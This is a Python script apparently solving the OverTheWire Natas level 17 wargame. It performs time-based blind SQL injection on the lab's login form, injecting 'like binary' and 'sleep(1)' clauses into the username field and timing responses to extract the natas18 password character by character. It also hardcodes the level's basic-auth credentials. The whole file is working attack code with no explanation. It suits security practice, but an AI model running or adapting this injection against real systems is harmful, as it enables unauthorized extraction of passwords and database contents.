from requests.auth import HTTPBasicAuth 
import requests
import string 

Auth=HTTPBasicAuth('natas17', '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw')
headers = {'content-type': 'application/x-www-form-urlencoded'} 
charset = ''.join(sorted(string.digits + string.ascii_letters))
neededchars = ''
password = ''

for char in charset:
	data = 'username=natas18%22+and+password+like+binary+%27%25{0}%25%27+and+sleep%281%29+%23'.format(char)  
	r = requests.post('http://natas17.natas.labs.overthewire.org/index.php', auth=Auth, data=data, headers=headers)  
	
	#print(r.text)
	if(r.elapsed.seconds >= 1):
		neededchars = neededchars + char
		print(neededchars) 

                
print(neededchars)
for i in range(32):  
	for char in neededchars:  
		payload = 'username=natas18%22%20and%20password%20like%20binary%20\'{0}%25\'%20and%20sleep(1)%23'.format(password + char)  
		r = requests.post('http://natas17.natas.labs.overthewire.org/index.php', auth=Auth, data=payload, headers=headers)  
		if(r.elapsed.seconds >= 1):  
				password = password + char  
				print(password)  
				break  
print(password)